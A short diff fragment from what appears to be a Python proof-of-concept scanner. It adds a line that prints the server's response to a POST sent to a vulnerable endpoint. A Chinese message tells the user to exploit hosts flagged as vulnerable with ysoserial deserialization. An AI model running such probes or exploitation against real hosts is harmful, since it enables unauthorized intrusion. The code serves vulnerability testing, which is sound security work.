@@ -39,6 +39,7 @@ def poc(host):
     try:
         
         r = requests.post(vulurl, headers=headers,data=data)
+        print(r.text)
         if r.status_code==200 and "archivesId" in r.text :
             print("http://"+host+":true")
             print("请使用ysoserial进行反序列化利用:https://blog.csdn.net/qq_41904294/article/details/131350965")
